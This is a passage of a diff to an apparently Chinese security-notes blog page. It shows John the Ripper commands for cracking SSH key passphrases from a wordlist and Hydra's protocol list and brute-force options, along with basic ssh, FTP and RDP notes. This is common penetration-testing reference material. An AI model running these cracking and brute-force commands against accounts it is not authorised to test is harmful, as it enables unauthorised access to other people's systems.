+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将文件转化成hash文件</span></span><br><span class="line">[john路径]/ssh2john.py 密码文件 &gt; 目标<span class="built_in">hash</span>文件</span><br><span class="line"><span class="comment"># 密码破解</span></span><br><span class="line">john --wordlist=密码本 <span class="built_in">hash</span>文件</span><br></pre></td></tr></table></figure>
 <h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
 <p>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。</p>
 <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">语法：hydra 参数 IP 服务</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"><span class="deletion">-l login 小写，指定用户名进行破解</span></span><br><span class="line"><span class="deletion">-L file 大写，指定用户的用户名字典</span></span><br><span class="line"><span class="deletion">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span></span><br><span class="line"><span class="deletion">-P file 大写，用于指定密码字典。</span></span><br><span class="line"><span class="deletion">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span></span><br><span class="line"><span class="deletion">-M file 指定目标ip列表文件，批量破解。</span></span><br><span class="line"><span class="deletion">-o file 指定结果输出文件</span></span><br></pre></td></tr></table></figure>
@@ -1998,7 +2145,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </div>
 <p>使用方式为：ftp url或ip，连接成功会提示用户输入账号密码</p>
 <h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>ascii：切换输出模式为文字模式<br>binary：切换传输模式为二进制模式<br>type：更改或显示目前传输模式</p>
-<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h2 id="MSTSC"><a href="#MSTSC" class="headerlink" title="MSTSC"></a>MSTSC</h2><h3 id="3389无法连接"><a href="#3389无法连接" class="headerlink" title="3389无法连接"></a>3389无法连接</h3><p>3389是远程桌面连接默认端口。连接不上的原因：</p>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">ssh <span class="selector-attr">[用户名]</span>@<span class="selector-attr">[主机ip]</span></span><br><span class="line">-<span class="selector-tag">i</span> <span class="selector-attr">[ssh私钥文件]</span>：z</span><br></pre></td></tr></table></figure>
+<h2 id="MSTSC"><a href="#MSTSC" class="headerlink" title="MSTSC"></a>MSTSC</h2><h3 id="3389无法连接"><a href="#3389无法连接" class="headerlink" title="3389无法连接"></a>3389无法连接</h3><p>3389是远程桌面连接默认端口。连接不上的原因：</p>
 <ol>
 <li>防护软件拦截了不安全的连接</li>
 <li>修改了端口</li>
